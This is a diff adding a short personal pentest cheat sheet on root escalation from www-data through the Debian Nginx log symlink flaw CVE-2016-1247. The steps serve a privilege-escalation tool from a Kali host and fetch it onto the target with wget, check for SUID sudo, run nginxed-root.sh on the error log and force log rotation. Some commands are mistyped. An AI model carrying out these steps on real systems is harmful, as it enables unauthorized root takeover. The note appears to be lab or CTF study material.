@@ -1,0 +1,37 @@
+Documentation:
+    https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+
+
+Discover the symlink-vuln on Nginx from "www-data" -> "root":
+    If we find a path where we have rwx perm (try via tmp or dev etc..):
+        We can install "linux-exploit-suggester" in the machine:
+            Kali:
+                python3 -m http.server <Port>
+
+            Linux:    
+                wget http://<Kali IP><Port>
+                curl -f cache 
+
+    If ok:
+        ./linux-exploit-suggester:
+            find "CVE-2016-1247" nginxed-root.sh
+        dpkg -l | grep nginx
+
+        find / -type f -perm -04000 -ls 2>/dev/null:
+            the exploit will work only:
+                IF "s" in /usr/bin/sudo
+
+        la -la /var/log/nginx
+            if permission ok:
+                we need to inject this scrypt:
+                    nginxed-root.sh <--- find in "Scrypt/nginxed-root.sh"
+
+            ./nginxed-root.sh /var/log/nginx/error.log
+
+        In the POC of the exploit it's specifyed that we need to wait until 6:25 am the next day the get our payload executed
+        Because we need to wait untill the log rotate of linux.
+
+        In Virtual Environement whre we have the root access we can rotate the logs manually:
+            invoke-rc.d nginx rotate > /dev/null 2>&1
+
+
